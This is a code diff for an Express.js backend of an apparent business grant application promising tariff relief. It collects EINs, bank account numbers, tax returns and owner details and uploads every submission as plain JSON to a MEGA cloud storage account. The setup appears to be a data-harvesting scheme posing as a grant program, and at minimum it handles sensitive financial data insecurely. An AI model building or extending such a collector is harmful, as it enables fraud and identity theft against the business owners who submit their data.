@@ -21,7 +21,9 @@ const megaStorage = new mega.Storage({
 
 router.post('/verify', async (req, res) => {
     try {
-        const { step, data } = req.body;
+        const { step } = req.body;
+        const data = req.body;
+        const files = req.files || {};
 
         if (!step || !data) {
             return res.status(200).json({ success: false, message: 'Invalid request data' });
@@ -29,8 +31,9 @@ router.post('/verify', async (req, res) => {
 
         const errors = {};
 
-        switch (step) {
-            case 1: // Validate Business Information
+        switch (parseInt(step, 10)) {
+            case 1:
+                // Validate Business Information
                 if (!data.businessName) errors.businessName = 'Business name is required';
                 if (!data.ein) {
                     errors.ein = 'EIN is required';
@@ -59,14 +62,16 @@ router.post('/verify', async (req, res) => {
                     errors.employees = 'Number of employees must be less than 200';
                 }
                 break;
-            case 2: // Validate Tariff Impact Details
+            case 2:
+                // Validate Tariff Impact Details
                 if (!data.industryType) errors.industryType = 'Industry type is required';
                 if (!data.impactDescription) errors.impactDescription = 'Impact description is required';
                 if (!data.estimatedImpact) errors.estimatedImpact = 'Estimated impact is required';
                 if (!data.impactPercentage) errors.impactPercentage = 'Impact percentage is required';
                 if (!data.mitigationEfforts) errors.mitigationEfforts = 'Mitigation efforts are required';
                 break;
-            case 3: // Validate Grant Request Details
+            case 3:
+                // Validate Grant Request Details
                 if (!data.fundAmount) {
                     errors.fundAmount = 'Fund amount is required';
                 } else if (data.fundAmount > 2000000) {
@@ -80,7 +85,8 @@ router.post('/verify', async (req, res) => {
                 }
                 if (!data.expectedOutcomes) errors.expectedOutcomes = 'Expected outcomes are required';
                 break;
-            case 4: // Validate Financial Details
+            case 4:
+                // Validate Financial Details
                 if (!data.bankName) errors.bankName = 'Bank name is required';
                 if (!data.accountNumber) {
                     errors.accountNumber = 'Account number is required'
@@ -94,24 +100,14 @@ router.post('/verify', async (req, res) => {
                 }
                 if (!data.accountType) errors.accountType = 'Account type is required';
                 break;
-            case 5: // Validate Documentation
-                const files = req.data || {};
+            case 5:
+                // Validate Documentation
                 const requiredFiles = ['taxReturns', 'financialStatements', 'tariffImpact', 'businessPlan', 'ownerInfo', 'licenses'];
-
                 for (const fileKey of requiredFiles) {
                     if (!files[fileKey]) {
                         errors[fileKey] = `${fileKey} is required`;
                     } else if (!files[fileKey].name || !files[fileKey].name.endsWith('.pdf')) {
                         errors[fileKey] = `${fileKey} must be a PDF file`;
-                    } else {
-                        // Upload file to MEGA
-                        const fileStream = files[fileKey].data;
-                        const megaFile = megaStorage.upload({ name: files[fileKey].name });
-                        fileStream.pipe(megaFile);
-                        await new Promise((resolve, reject) => {
-                            megaFile.on('complete', resolve);
-                            megaFile.on('error', reject);
-                        });
                     }
                 }
                 break;
@@ -132,17 +128,18 @@ router.post('/verify', async (req, res) => {
 
 router.post('/submit', async (req, res) => {
     try {
-        const data = req.body; // Assuming the data to be written is in req.body
+        const data = req.body;
+        const files = req.files || {};
 
         // Convert data to JSON string
-        const jsonData = JSON.stringify(data);
+        const jsonData = JSON.stringify({ ...data, files: Object.keys(files) });
 
         // Create a readable stream from the JSON string
         const jsonStream = Readable.from(jsonData);
 
         // Upload JSON file to MEGA
-        const timestamp = new Date().toISOString().replace(/[:.]/g, '-'); // Format timestamp
-        const fileName = `business_application_${timestamp}.json`; // Add timestamp to file name
+        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+        const fileName = `business_application_${timestamp}.json`;
         const megaFile = megaStorage.upload({ name: fileName });
         jsonStream.pipe(megaFile);
 
